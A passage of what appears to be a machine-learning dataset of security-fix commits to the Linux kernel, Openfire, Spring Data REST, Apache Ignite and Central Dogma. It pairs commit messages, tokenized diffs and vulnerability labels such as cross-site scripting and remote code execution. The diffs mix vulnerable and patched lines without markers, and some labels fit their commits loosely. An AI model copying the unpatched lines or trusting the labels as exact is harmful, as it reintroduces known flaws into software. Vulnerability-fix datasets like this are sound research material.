"EINVAL", ";", "overrun", "=", "timr", "-", ">", "it_overrun_last", ";", "overrun", "=", "timer_overrun_to_int", "(", "timr", ",", "0", ")", ";", "unlock_timer", "(", "timr", ",", "flags", ")", ";", "return", "overrun", ";"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["ARM:", "amba:", "Don't", "read", "past", "the", "end", "of", "sysfs", "\"driver_override\"", "buffer", "When", "printing", "the", "driver_override", "parameter", "when", "it", "is", "4095", "and", "4094", "bytes", "long,", "the", "printing", "code", "would", "access", "invalid", "memory", "because", "we", "need", "count", "+", "1", "bytes", "for", "printing.", "Cfr.", "commits", "4efe874aace57dba", "(\"PCI:", "Don't", "read", "past", "the", "end", "of", "sysfs", "\"driver_override\"", "buffer\")", "and", "bf563b01c2895a4b", "(\"driver", "core:", "platform:", "Don't", "read", "past", "the", "end", "of", "\"driver_override\"", "buffer\").", "Fixes:", "3cf385713460eb2b", "(\"ARM:", "8256/1:", "driver", "coamba:", "add", "device", "binding", "path", "'driver_override'\")", "Signed-off-by:", "Geert", "Uytterhoeven", "<geert+renesas@glider.be>", "Reviewed-by:", "Todd", "Kjos", "<tkjos@google.com>", "Cc:", "stable", "<stable@vger.kernel.org>", "Signed-off-by:", "Greg", "Kroah-Hartman", "<gregkh@linuxfoundation.org>"], "code_tokens": ["@", "@", "-", "87", ",", "7", "+", "87", ",", "8", "@", "@", "static", "ssize_t", "driver_override_store", "(", "struct", "device", "*", "_dev", ",", "struct", "amba_device", "*", "dev", "=", "to_amba_device", "(", "_dev", ")", ";", "char", "*", "driver_override", ",", "*", "old", ",", "*", "cp", ";", "if", "(", "count", ">", "PATH_MAX", ")", "/", "*", "We", "need", "to", "keep", "extra", "room", "for", "a", "newline", "*", "/", "if", "(", "count", ">", "=", "(", "PAGE_SIZE", "-", "1", ")", ")", "return", "-", "EINVAL", ";", "driver_override", "=", "kstrndup", "(", "buf", ",", "count", ",", "GFP_KERNEL", ")", ";"], "docstring_tokens": ["out", "of", "bounds", "write"]}
{"contents": ["Fix", "issues", "identified", "by", "CSW", "(#1561)"], "code_tokens": ["@", "@", "-", "45", ",", "7", "+", "45", ",", "7", "@", "@", "protected", "void", "doGet", "(", "final", "HttpServletRequest", "request", ",", "final", "HttpServletResponse", ".", "map", "(", "cache", "-", ">", "(", "Cache", "<", "?,", "?", ">)", "cache", ")", ";", "if", "(", "!", "optionalCache", ".", "isPresent", "(", "))", "{", "request", ".", "setAttribute", "(", "\"", "warningMessage", "\"", ",", "LocaleUtils", ".", "getLocalizedString", "(", "\"", "system", ".", "cache", "-", "details", ".", "cache_not_found", "\"", ",", "Collections", ".", "singletonList", "(", "cacheName", ")", "))", ";", "request", ".", "setAttribute", "(", "\"", "warningMessage", "\"", ",", "LocaleUtils", ".", "getLocalizedString", "(", "\"", "system", ".", "cache", "-", "details", ".", "cache_not_found", "\"", ",", "Collections", ".", "singletonList", "(", "StringUtils", ".", "escapeHTMLTags", "(", "cacheName", ")", "))", ");", "}", "final", "boolean", "secretKey", "=", "optionalCache", ".", "map", "(", "Cache", ":", ":", "isKeySecret", ")", ".", "orElse", "(", "Boolean", ".", "FALSE", ")", ";", "@", "@", "-", "150", ",", "7", "+", "150", ",", "7", "@", "@", "<", "label", "for", "=", "\"", "alias", "\"", "><", "fmt", ":", "message", "key", "=", "\"", "ssl", ".", "signing", "-", "request", ".", "alias", "\"", "/>", "</", "label", ">", "<", "/", "td", ">", "<", "td", "width", "=", "\"", "99", "%", "\">", "<", "input", "type", "=", "\"", "text", "\"", "size", "=", "\"", "30", "\"", "maxlength", "=", "\"", "100", "\"", "name", "=", "\"", "alias", "\"", "id", "=", "\"", "alias", "\"", "value", "=", "\"$", "{", "param", ".", "alias", "}", "\">", "<", "input", "type", "=", "\"", "text", "\"", "size", "=", "\"", "30", "\"", "maxlength", "=", "\"", "100", "\"", "name", "=", "\"", "alias", "\"", "id", "=", "\"", "alias", "\"", "value", "=", "\"<", "c", ":", "out", "value", "=", "'$", "{", "param", ".", "alias", "}", "'/", ">\"", "\">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", "valign", "=", "\"", "top", "\"", ">", "@", "@", "-", "490", ",", "7", "+", "490", ",", "7", "@", "@", "<", "form", "action", "=", "\"", "security", "-", "certificate", "-", "details", ".", "jsp", "\"", ">", "<", "input", "type", "=", "\"", "hidden", "\"", "name", "=", "\"", "connectionType", "\"", "value", "=", "\"$", "{", "connectionType", "}", "\"/", ">", "<", "input", "type", "=", "\"", "hidden", "\"", "name", "=", "\"", "isTrustStore", "\"", "value", "=", "\"$", "{", "param", ".", "isTrustStore", "}", "\"/", ">", "<", "input", "type", "=", "\"", "hidden", "\"", "name", "=", "\"", "isTrustStore", "\"", "value", "=", "\"<", "c", ":", "out", "value", "=", "'$", "{", "param", ".", "isTrustStore", "}", "'/", ">\"", "/>", "<", "div", "style", "=", "\"", "text", "-", "align", ":", "center", ";", "\">", "<", "input", "type", "=", "\"", "submit", "\"", "name", "=", "\"", "back", "\"", "value", "=", "\"<", "fmt", ":", "message", "key", "=", "\"", "session", ".", "details", ".", "back_button", "\"", "/>", "\">", "<", "/", "div", ">", "@", "@", "-", "9", ",", "7", "+", "9", ",", "8", "@", "@", "<", "jsp", ":", "useBean", "scope", "=", "\"", "request", "\"", "id", "=", "\"", "search", "\"", "type", "=", "\"", "org", ".", "jivesoftware", ".", "admin", ".", "servlet", ".", "SystemCacheDetailsServlet", ".", "Search", "\"", "/>", "<", "%@", "page", "contentType", "=", "\"", "text", "/", "html", ";", "charset", "=", "UTF", "-", "8", "\"", "%", ">", "<", "head", ">", "<", "title", ">", "<", "fmt", ":", "message", "key", "=", "\"", "system", ".", "cache", "-", "details", ".", "title", "\"", "><", "fmt", ":", "param", "value", "=", "\"$", "{", "cacheName", "}", "\"/", "><", "/", "fmt", ":", "message", ">", "</", "title", ">", "<", "fmt", ":", "message", "key", "=", "\"", "system", ".", "cache", "-", "details", ".", "title", "\"", "var", "=", "\"", "title", "\"", "><", "fmt", ":", "param", "value", "=", "\"$", "{", "cacheName", "}", "\"/", "><", "/", "fmt", ":", "message", ">", "<", "title", ">", "<", "c", ":", "out", "value", "=", "\"$", "{", "title", "}", "\"/", "><", "/", "title", ">", "<", "meta", "name", "=", "\"", "pageID", "\"", "content", "=", "\"", "system", "-", "cache", "\"", "/>", "<", "style", "type", "=", "\"", "text", "/", "css", "\"", ">", "img", ".", "clickable", "{", "@", "@", "-", "235", ",", "7", "+", "235", ",", "7", "@", "@", "<", "td", "align", "=", "\"", "right", "\"", "valign", "=", "\"", "bottom", "\"", "><", "fmt", ":", "message", "key", "=", "\"", "group", ".", "summary", ".", "search", "\"", "/", ">:", "<", "input", "type", "=", "\"", "text", "\"", "size", "=", "\"", "30", "\"", "maxlength", "=", "\"", "150", "\"", "name", "=", "\"", "search", "\"", "value", "=", "\"<", "%=", "((", "search", "!", "=", "null", ")", "?", "search", ":", "\"", "\")", "%>", "\">", "</", "td", ">", "value", "=", "\"<", "c", ":", "out", "value", "=", "'$", "{", "param", ".", "search", "}", "'/", ">\"", "><", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "table", ">", "<", "input", "type", "=", "\"", "hidden", "\"", "name", "=", "\"", "username", "\""], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["DATAREST-1127", "-", "Patch", "operations", "now", "always", "verify", "paths", "before", "operation", "application.", "Previously,", "the", "SpEL", "expression", "created", "from", "JSON", "Patch", "path", "expressions", "were", "executed", "without", "double", "checking", "whether", "these", "paths", "actually", "exist", "on", "the", "target", "object", "in", "the", "first", "place.", "This", "check", "is", "now", "in", "place."], "code_tokens": ["@", "@", "-", "15", ",", "11", "+", "15", ",", "7", "@", "@", "*", "/", "package", "org", ".", "springframework", ".", "data", ".", "rest", ".", "webmvc", ".", "json", ".", "patch", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "springframework", ".", "data", ".", "mapping", ".", "PropertyPath", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "/", "**", "*", "Operation", "to", "add", "a", "new", "value", "to", "the", "given", "\"", "path", "\"", ".", "Will", "throw", "a", "{", "@", "link", "PatchException", "}", "if", "the", "path", "is", "invalid", "or", "if", "@", "@", "-", "60", ",", "17", "+", "56", ",", "8", "@", "@", "public", "AddOperation", "(", "String", "path", ",", "Object", "value", ")", "{", "return", "super", ".", "evaluateValueFromTarget", "(", "targetObject", ",", "entityType", ")", ";", "}", "List", "<", "String", ">", "segments", "=", "new", "ArrayList", "<", "String", ">", "()", ";", "for", "(", "String", "segment", ":", "path", ".", "split", "(", "\"/", "\")", ")", "{", "if", "(", "!(", "segment", ".", "matches", "(", "\"\\", "\\", "d", "+", "\")", "|", "|", "segment", ".", "equals", "(", "\"-", "\")", "|", "|", "segment", ".", "isEmpty", "(", "))", ")", "{", "segments", ".", "add", "(", "segment", ")", ";", "}", "}", "PropertyPath", "propertyPath", "=", "PropertyPath", ".", "from", "(", "StringUtils", ".", "collectionToDelimitedString", "(", "segments", ",", "\"", ".\"", "),", "entityType", ")", ";", "PropertyPath", "path", "=", "verifyPath", "(", "entityType", ")", ";", "return", "value", "instanceof", "LateObjectEvaluator", "?", "(", "(", "LateObjectEvaluator", ")", "value", ")", ".", "evaluate", "(", "propertyPath", ".", "getType", "(", "))", ":", "value", ";", "return", "evaluate", "(", "path", "=", "=", "null", "?", "entityType", ":", "path", ".", "getType", "(", "))", ";", "}", "}", "@", "@", "-", "17", ",", "14", "+", "17", ",", "18", "@", "@", "import", "static", "org", ".", "springframework", ".", "data", ".", "rest", ".", "webmvc", ".", "json", ".", "patch", ".", "PathToSpEL", ".", "*;", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "List", ";", "import", "org", ".", "springframework", ".", "core", ".", "CollectionFactory", ";", "import", "org", ".", "springframework", ".", "core", ".", "convert", ".", "TypeDescriptor", ";", "import", "org", ".", "springframework", ".", "data", ".", "mapping", ".", "PropertyPath", ";", "import", "org", ".", "springframework", ".", "data", ".", "mapping", ".", "PropertyReferenceException", ";", "import", "org", ".", "springframework", ".", "expression", ".", "Expression", ";", "import", "org", ".", "springframework", ".", "expression", ".", "ExpressionException", ";", "import", "org", ".", "springframework", ".", "expression", ".", "spel", ".", "SpelEvaluationException", ";", "import", "org", ".", "springframework", ".", "util", ".", "StringUtils", ";", "/", "**", "*", "Abstract", "base", "class", "representing", "and", "providing", "support", "methods", "for", "patch", "operations", ".", "@", "@", "-", "35", ",", "6", "+", "39", ",", "8", "@", "@", "*", "/", "public", "abstract", "class", "PatchOperation", "{", "private", "static", "final", "String", "INVALID_PATH_REFERENCE", "=", "\"", "Invalid", "path", "reference", "%", "s", "on", "type", "%", "s", "(", "from", "source", "%", "s", ")", "!\"", ";", "protected", "final", "String", "op", ";", "protected", "final", "String", "path", ";", "protected", "final", "Object", "value", ";", "@", "@", "-", "193", ",", "8", "+", "199", ",", "13", "@", "@", "protected", "Object", "getValueFromTarget", "(", "Object", "target", ")", "{", "*", "/", "protected", "<", "T", ">", "Object", "evaluateValueFromTarget", "(", "Object", "targetObject", ",", "Class", "<", "T", ">", "entityType", ")", "{", "return", "value", "instanceof", "LateObjectEvaluator", "?", "(", "(", "LateObjectEvaluator", ")", "value", ")", ".", "evaluate", "(", "spelExpression", ".", "getValueType", "(", "targetObject", ")", ")", ":", "value", ";", "verifyPath", "(", "entityType", ")", ";", "return", "evaluate", "(", "spelExpression", ".", "getValueType", "(", "targetObject", ")", ");", "}", "protected", "final", "<", "T", ">", "Object", "evaluate", "(", "Class", "<", "T", ">", "targetType", ")", "{", "return", "value", "instanceof", "LateObjectEvaluator", "?", "(", "(", "LateObjectEvaluator", ")", "value", ")", ".", "evaluate", "(", "targetType", ")", ":", "value", ";", "}", "/", "**", "@", "@", "-", "219", ",", "4", "+", "230", ",", "32", "@", "@", "private", "Integer", "targetListIndex", "(", "String", "path", ")", "{", "return", "null", ";", "}", "}", "/", "**", "*", "Verifies", ",", "that", "the", "path", "for", "the", "current", "operation", "is", "a", "valid", "property", "path", "on", "the", "given", "target", "type", ".", "*", "*", "@", "param", "type", "must", "not", "be", "{", "@", "literal", "null", "}", ".", "*", "/", "protected", "PropertyPath", "verifyPath", "(", "Class", "<", "?>", "type", ")", "{", "List", "<", "String", ">", "segments", "=", "new", "ArrayList", "<", "String", ">", "()", ";", "for", "(", "String", "segment", ":", "path", ".", "split", "(", "\"/", "\")", ")", "{", "if", "(", "!(", "segment", ".", "matches", "(", "\"\\", "\\", "d", "+", "\")", "|", "|", "segment", ".", "equals", "(", "\"-", "\")", "|", "|", "segment", ".", "isEmpty", "(", "))", ")", "{", "segments", ".", "add", "(", "segment", ")", ";", "}", "}", "if", "(", "segments", ".", "isEmpty", "(", "))", "{", "return", "null", ";", "}", "String", "pathSource", "=", "StringUtils", ".", "collectionToDelimitedString", "(", "segments", ",", "\"", ".\"", ");", "try", "{", "return", "PropertyPath", ".", "from", "(", "pathSource", ",", "type", ")", ";", "}", "catch", "(", "PropertyReferenceException", "o_O", ")", "{", "throw", "new", "PatchException", "(", "String", ".", "format", "(", "INVALID_PATH_REFERENCE", ",", "pathSource", ",", "type", ",", "path", ")", ",", "o_O", ")", ";", "}", "}", "}", "@", "@", "-", "162", ",", "6", "+", "162", ",", "11", "@", "@", "public", "void", "failureWithInvalidPatchContent", "(", ")", "throws", "Exception", "{", "patch", ".", "apply", "(", "todo", ",", "Todo", ".", "class", ")", ";", "}", "@", "Test", "(", "expected", "=", "PatchException", ".", "class", ")", "/", "/", "DATAREST", "-", "1127", "public", "void", "rejectsInvalidPaths", "(", ")", "throws", "Exception", "{", "readJsonPatch", "(", "\"", "patch", "-", "invalid", "-", "path", ".", "json", "\"", ").", "apply", "(", "new", "Todo", "(", "),", "Todo", ".", "class", ")", ";", "}", "private", "Patch", "readJsonPatch", "(", "String", "jsonPatchFile", ")", "throws", "IOException", ",", "JsonParseException", ",", "JsonMappingException", "{", "ClassPathResource", "resource", "=", "new", "ClassPathResource", "(", "jsonPatchFile", ",", "getClass", "(", "))", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "3", "@", "@", "[", "{", "\"", "op", "\"", ":\"", "replace", "\"", ",", "\"", "path", "\"", ":\"", "/", "somethingInvalid", "\"", ",", "\"", "value", "\"", ":", "\"", "bar", "\"", "}", "]"], "docstring_tokens": ["patch", "request", "remote", "code", "execution"]}
{"contents": ["mm:", "avoid", "wrapping", "vm_pgoff", "in", "mremap()", "The", "normal", "mmap", "paths", "all", "avoid", "creating", "a", "mapping", "where", "the", "pgoff", "inside", "the", "mapping", "could", "wrap", "around", "due", "to", "overflow.", "However,", "an", "expanding", "mremap()", "can", "take", "such", "a", "non-wrapping", "mapping", "and", "make", "it", "bigger", "and", "cause", "a", "wrapping", "condition.", "Noticed", "by", "Robert", "Swiecki", "when", "running", "a", "system", "call", "fuzzer,", "where", "it", "caused", "a", "BUG_ON()", "due", "to", "terminally", "confusing", "the", "vma_prio_tree", "code.", "A", "vma", "dumping", "patch", "by", "Hugh", "then", "pinpointed", "the", "crazy", "wrapped", "case.", "Reported-and-tested-by:", "Robert", "Swiecki", "<robert@swiecki.net>", "Acked-by:", "Hugh", "Dickins", "<hughd@google.com>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "277", ",", "9", "+", "277", ",", "16", "@", "@", "static", "struct", "vm_area_struct", "*", "vma_to_resize", "(", "unsigned", "long", "addr", ",", "if", "(", "old_len", ">", "vma", "-", ">", "vm_end", "-", "addr", ")", "goto", "Efault", ";", "if", "(", "vma", "-", ">", "vm_flags", "&", "(", "VM_DONTEXPAND", "|", "VM_PFNMAP", ")", ")", "{", "if", "(", "new_len", ">", "old_len", ")", "/", "*", "Need", "to", "be", "careful", "about", "a", "growing", "mapping", "*", "/", "if", "(", "new_len", ">", "old_len", ")", "{", "unsigned", "long", "pgoff", ";", "if", "(", "vma", "-", ">", "vm_flags", "&", "(", "VM_DONTEXPAND", "|", "VM_PFNMAP", ")", ")", "goto", "Efault", ";", "pgoff", "=", "(", "addr", "-", "vma", "-", ">", "vm_start", ")", ">", ">", "PAGE_SHIFT", ";", "pgoff", "+", "=", "vma", "-", ">", "vm_pgoff", ";", "if", "(", "pgoff", "+", "(", "new_len", ">", ">", "PAGE_SHIFT", ")", "<", "pgoff", ")", "goto", "Einval", ";", "}", "if", "(", "vma", "-", ">", "vm_flags", "&", "VM_LOCKED", ")", "{"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["mm:", "migrate", "dirty", "page", "without", "clear_page_dirty_for_io", "etc", "clear_page_dirty_for_io()", "has", "accumulated", "writeback", "and", "memcg", "subtleties", "since", "v2.6.16", "first", "introduced", "page", "migration;", "and", "the", "set_page_dirty()", "which", "completed", "its", "migration", "of", "PageDirty,", "later", "had", "to", "be", "moderated", "to", "__set_page_dirty_nobuffers();", "then", "PageSwapBacked", "had", "to", "skip", "that", "too.", "No", "actual", "problems", "seen", "with", "this", "procedure", "recently,", "but", "if", "you", "look", "into", "what", "the", "clear_page_dirty_for_io(page)+set_page_dirty(newpage)", "is", "actually", "achieving,", "it", "turns", "out", "to", "be", "nothing", "more", "than", "moving", "the", "PageDirty", "flag,", "and", "its", "NR_FILE_DIRTY", "stat", "from", "one", "zone", "to", "another.", "It", "would", "be", "good", "to", "avoid", "a", "pile", "of", "irrelevant", "decrementations", "and", "incrementations,", "and", "improper", "event", "counting,", "and", "unnecessary", "descent", "of", "the", "radix_tree", "under", "tree_lock", "(to", "set", "the", "PAGECACHE_TAG_DIRTY", "which", "radix_tree_replace_slot()", "left", "in", "place", "anyway).", "Do", "the", "NR_FILE_DIRTY", "movement,", "like", "the", "other", "stats", "movements,", "while", "interrupts", "still", "disabled", "in", "migrate_page_move_mapping();", "and", "don't", "even", "bother", "if", "the", "zone", "is", "the", "same.", "Do", "the", "PageDirty", "movement", "there", "under", "tree_lock", "too,", "where", "old", "page", "is", "frozen", "and", "newpage", "not", "yet", "visible:", "bearing", "in", "mind", "that", "as", "soon", "as", "newpage", "becomes", "visible", "in", "radix_tree,", "an", "un-page-locked", "set_page_dirty()", "might", "interfere", "(or", "perhaps", "that's", "just", "not", "possible:", "anything", "doing", "so", "should", "already", "hold", "an", "additional", "reference", "to", "the", "old", "page,", "preventing", "its", "migration;", "but", "play", "safe).", "But", "we", "do", "still", "need", "to", "transfer", "PageDirty", "in", "migrate_page_copy(),", "for", "those", "who", "don't", "go", "the", "mapping", "route", "through", "migrate_page_move_mapping().", "Signed-off-by:", "Hugh", "Dickins", "<hughd@google.com>", "Cc:", "Christoph", "Lameter", "<cl@linux.com>", "Cc:", "\"Kirill", "A.", "Shutemov\"", "<kirill.shutemov@linux.intel.com>", "Cc:", "Rik", "van", "Riel", "<riel@redhat.com>", "Cc:", "Vlastimil", "Babka", "<vbabka@suse.cz>", "Cc:", "Davidlohr", "Bueso", "<dave@stgolabs.net>", "Cc:", "Oleg", "Nesterov", "<oleg@redhat.com>", "Cc:", "Sasha", "Levin", "<sasha.levin@oracle.com>", "Cc:", "Dmitry", "Vyukov", "<dvyukov@google.com>", "Cc:", "KOSAKI", "Motohiro", "<kosaki.motohiro@jp.fujitsu.com>", "Signed-off-by:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "30", ",", "6", "+", "30", ",", "7", "@", "@", "#", "include", "<", "linux", "/", "mempolicy", ".", "h", ">", "#", "include", "<", "linux", "/", "vmalloc", ".", "h", ">", "#", "include", "<", "linux", "/", "security", ".", "h", ">", "#", "include", "<", "linux", "/", "backing", "-", "dev", ".", "h", ">", "#", "include", "<", "linux", "/", "syscalls", ".", "h", ">", "#", "include", "<", "linux", "/", "hugetlb", ".", "h", ">", "#", "include", "<", "linux", "/", "hugetlb_cgroup", ".", "h", ">", "@", "@", "-", "313", ",", "6", "+", "314", ",", "8", "@", "@", "int", "migrate_page_move_mapping", "(", "struct", "address_space", "*", "mapping", ",", "struct", "buffer_head", "*", "head", ",", "enum", "migrate_mode", "mode", ",", "int", "extra_count", ")", "{", "struct", "zone", "*", "oldzone", ",", "*", "newzone", ";", "int", "dirty", ";", "int", "expected_count", "=", "1", "+", "extra_count", ";", "void", "*", "*", "pslot", ";", "@", "@", "-", "331", ",", "6", "+", "334", ",", "9", "@", "@", "int", "migrate_page_move_mapping", "(", "struct", "address_space", "*", "mapping", ",", "return", "MIGRATEPAGE_SUCCESS", ";", "}", "oldzone", "=", "page_zone", "(", "page", ")", ";", "newzone", "=", "page_zone", "(", "newpage", ")", ";", "spin_lock_irq", "(", "&", "mapping", "-", ">", "tree_lock", ")", ";", "pslot", "=", "radix_tree_lookup_slot", "(", "&", "mapping", "-", ">", "page_tree", ",", "@", "@", "-", "378", ",", "6", "+", "384", ",", "13", "@", "@", "int", "migrate_page_move_mapping", "(", "struct", "address_space", "*", "mapping", ",", "set_page_private", "(", "newpage", ",", "page_private", "(", "page", ")", ");", "}", "/", "*", "Move", "dirty", "while", "page", "refs", "frozen", "and", "newpage", "not", "yet", "exposed", "*", "/", "dirty", "=", "PageDirty", "(", "page", ")", ";", "if", "(", "dirty", ")", "{", "ClearPageDirty", "(", "page", ")", ";", "SetPageDirty", "(", "newpage", ")", ";", "}", "radix_tree_replace_slot", "(", "pslot", ",", "newpage", ")", ";", "/", "*", "@", "@", "-", "387", ",", "6", "+", "400", ",", "9", "@", "@", "int", "migrate_page_move_mapping", "(", "struct", "address_space", "*", "mapping", ",", "*", "/", "page_unfreeze_refs", "(", "page", ",", "expected_count", "-", "1", ")", ";", "spin_unlock", "(", "&", "mapping", "-", ">", "tree_lock", ")", ";", "/", "*", "Leave", "irq", "disabled", "to", "prevent", "preemption", "while", "updating", "stats", "*", "/", "/", "*", "*", "If", "moved", "to", "a", "different", "zone", "then", "also", "account", "*", "the", "page", "for", "that", "zone", ".", "Other", "VM", "counters", "will", "be", "@", "@", "-", "397", ",", "13", "+", "413", ",", "19", "@", "@", "int", "migrate_page_move_mapping", "(", "struct", "address_space", "*", "mapping", ",", "*", "via", "NR_FILE_PAGES", "and", "NR_ANON_PAGES", "if", "they", "*", "are", "mapped", "to", "swap", "space", ".", "*", "/", "__dec_zone_page_state", "(", "page", ",", "NR_FILE_PAGES", ")", ";", "__inc_zone_page_state", "(", "newpage", ",", "NR_FILE_PAGES", ")", ";", "if", "(", "!", "PageSwapCache", "(", "page", ")", "&", "&", "PageSwapBacked", "(", "page", ")", ")", "{", "__dec_zone_page_state", "(", "page", ",", "NR_SHMEM", ")", ";", "__inc_zone_page_state", "(", "newpage", ",", "NR_SHMEM", ")", ";", "if", "(", "newzone", "!", "=", "oldzone", ")", "{", "__dec_zone_state", "(", "oldzone", ",", "NR_FILE_PAGES", ")", ";", "__inc_zone_state", "(", "newzone", ",", "NR_FILE_PAGES", ")", ";", "if", "(", "PageSwapBacked", "(", "page", ")", "&", "&", "!", "PageSwapCache", "(", "page", ")", ")", "{", "__dec_zone_state", "(", "oldzone", ",", "NR_SHMEM", ")", ";", "__inc_zone_state", "(", "newzone", ",", "NR_SHMEM", ")", ";", "}", "if", "(", "dirty", "&", "&", "mapping_cap_account_dirty", "(", "mapping", ")", ")", "{", "__dec_zone_state", "(", "oldzone", ",", "NR_FILE_DIRTY", ")", ";", "__inc_zone_state", "(", "newzone", ",", "NR_FILE_DIRTY", ")", ";", "}", "}", "spin_unlock_irq", "(", "&", "mapping", "-", ">", "tree_lock", ")", ";", "local_irq_enable", "(", ");", "return", "MIGRATEPAGE_SUCCESS", ";", "}", "@", "@", "-", "524", ",", "20", "+", "546", ",", "9", "@", "@", "void", "migrate_page_copy", "(", "struct", "page", "*", "newpage", ",", "struct", "page", "*", "page", ")", "if", "(", "PageMappedToDisk", "(", "page", ")", ")", "SetPageMappedToDisk", "(", "newpage", ")", ";", "if", "(", "PageDirty", "(", "page", ")", ")", "{", "clear_page_dirty_for_io", "(", "page", ")", ";", "/", "*", "*", "Want", "to", "mark", "the", "page", "and", "the", "radix", "tree", "as", "dirty", ",", "and", "*", "redo", "the", "accounting", "that", "clear_page_dirty_for_io", "undid", ",", "*", "but", "we", "can", "'", "t", "use", "set_page_dirty", "because", "that", "function", "*", "is", "actually", "a", "signal", "that", "all", "of", "the", "page", "has", "become", "dirty", ".", "*", "Whereas", "only", "part", "of", "our", "page", "may", "be", "dirty", ".", "*", "/", "if", "(", "PageSwapBacked", "(", "page", ")", ")", "SetPageDirty", "(", "newpage", ")", ";", "else", "__set_page_dirty_nobuffers", "(", "newpage", ")", ";", "}", "/", "*", "Move", "dirty", "on", "pages", "not", "done", "by", "migrate_page_move_mapping", "(", ")", "*", "/", "if", "(", "PageDirty", "(", "page", ")", ")", "SetPageDirty", "(", "newpage", ")", ";", "if", "(", "page_is_young", "(", "page", ")", ")", "set_page_young", "(", "newpage", ")", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["IGNITE-4537", "-", "Filter", "possible", "sensitive", "user", "data", "that", "might", "be", "set", "in", "system", "properties", "to", "send", "in", "update", "notifier."], "code_tokens": ["@", "@", "-", "23", ",", "6", "+", "23", ",", "7", "@", "@", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Properties", ";", "import", "javax", ".", "net", ".", "ssl", ".", "HostnameVerifier", ";", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "optimized", ".", "OptimizedMarshaller", ";", "import", "org", ".", "jetbrains", ".", "annotations", ".", "Nullable", ";", "@", "@", "-", "526", ",", "6", "+", "527", ",", "15", "@", "@", "*", "/", "public", "static", "final", "String", "IGNITE_UNWRAP_BINARY_FOR_INDEXING_SPI", "=", "\"", "IGNITE_UNWRAP_BINARY_FOR_INDEXING_SPI", "\"", ";", "/", "**", "Returns", "true", "for", "system", "properties", "only", "avoiding", "sending", "sensitive", "information", ".", "*", "/", "private", "static", "final", "IgnitePredicate", "<", "Map", ".", "Entry", "<", "String", ",", "String", ">", ">", "PROPS_FILTER", "=", "new", "IgnitePredicate", "<", "Map", ".", "Entry", "<", "String", ",", "String", ">", ">(", ")", "{", "@", "Override", "public", "boolean", "apply", "(", "final", "Map", ".", "Entry", "<", "String", ",", "String", ">", "entry", ")", "{", "final", "String", "key", "=", "entry", ".", "getKey", "(", ");", "return", "key", ".", "startsWith", "(", "\"", "java", ".", "\")", "|", "|", "key", ".", "startsWith", "(", "\"", "os", ".", "\")", "|", "|", "key", ".", "startsWith", "(", "\"", "user", ".", "\")", ";", "}", "}", ";", "/", "**", "*", "Enforces", "singleton", ".", "*", "/", "@", "@", "-", "699", ",", "4", "+", "709", ",", "26", "@", "@", "public", "static", "Properties", "snapshot", "(", ")", "{", "return", "sysProps", ";", "}", "/", "**", "*", "Does", "the", "same", "as", "{", "@", "link", "#", "snapshot", "(", ")}", "but", "filters", "out", "*", "possible", "sensitive", "user", "data", ".", "*", "*", "@", "return", "Snapshot", "of", "system", "properties", ".", "*", "/", "@", "SuppressWarnings", "(", "\"", "unchecked", "\"", ")", "public", "static", "Properties", "safeSnapshot", "(", ")", "{", "final", "Properties", "props", "=", "snapshot", "(", ");", "final", "Iterator", "<", "Map", ".", "Entry", "<", "Object", ",", "Object", ">", ">", "iter", "=", "props", ".", "entrySet", "(", ").", "iterator", "(", ");", "while", "(", "iter", ".", "hasNext", "(", "))", "{", "final", "Map", ".", "Entry", "entry", "=", "iter", ".", "next", "(", ");", "if", "(", "!", "PROPS_FILTER", ".", "apply", "(", "entry", ")", ")", "iter", ".", "remove", "(", ");", "}", "return", "props", ";", "}", "}", "@", "@", "-", "169", ",", "7", "+", "169", ",", "7", "@", "@", "private", "static", "String", "getSystemProperties", "(", ")", "{", "StringWriter", "sw", "=", "new", "StringWriter", "(", ");", "try", "{", "IgniteSystemProperties", ".", "snapshot", "(", ").", "store", "(", "new", "PrintWriter", "(", "sw", ")", ",", "\"", "\")", ";", "IgniteSystemProperties", ".", "safeSnapshot", "(", ").", "store", "(", "new", "PrintWriter", "(", "sw", ")", ",", "\"", "\")", ";", "}", "catch", "(", "IOException", "ignore", ")", "{", "return", "null", ";"], "docstring_tokens": ["arbitrary", "file", "read"]}
{"contents": ["Fix", "XSS", "on", "a", "search", "feature", "(#422)", "Motivation:", "XSS", "issue", "has", "been", "reported", "by", "LINE", "Security", "team.", "Modification:", "-", "Sanitize", "html", "on", "error", "notification", "message.", "-", "Invalid", "search", "query", "returns", "`Bad", "Request`", "instead", "of", "Internal", "Server", "Error.", "-", "Replace", "`jGitRepository`", "into", "`parent.name()", "+", "'/'", "+", "name`", "to", "prevent", "exposure", "of", "a", "full", "file", "system", "path", "on", "the", "error", "message.", "Result:", "-", "Fixes"], "code_tokens": ["@", "@", "-", "531", ",", "11", "+", "531", ",", "12", "@", "@", "public", "RevisionRange", "normalizeNow", "(", "Revision", "from", ",", "Revision", "to", ")", "{", "}", "return", "Util", ".", "unsafeCast", "(", "result", ")", ";", "}", "catch", "(", "CentralDogmaException", "e", ")", "{", "}", "catch", "(", "CentralDogmaException", "|", "IllegalArgumentException", "e", ")", "{", "throw", "e", ";", "}", "catch", "(", "Exception", "e", ")", "{", "throw", "new", "StorageException", "(", "\"", "failed", "to", "get", "data", "from", "\"", "+", "jGitRepository", "+", "\"", "at", "\"", "+", "pathPattern", "+", "\"", "for", "\"", "+", "revision", ",", "e", ")", ";", 